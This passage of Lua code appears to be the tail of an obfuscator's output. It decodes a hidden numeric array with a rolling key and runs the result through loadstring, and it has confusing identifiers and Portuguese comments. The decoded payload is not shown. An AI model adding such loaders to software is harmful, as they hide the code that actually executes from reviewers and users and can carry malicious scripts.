    local function VM_OOIlI1(d, k, m)
        local R_OIllIl = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_OIllIl, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_OIllIl)
    end

    -- Execution Guard
    local F_1O01 = loadstring(VM_OOIlI1(B_1l10ll1, 20, 5))
    if F_1O01 then
        F_1O01(...)
    end
end)(...)
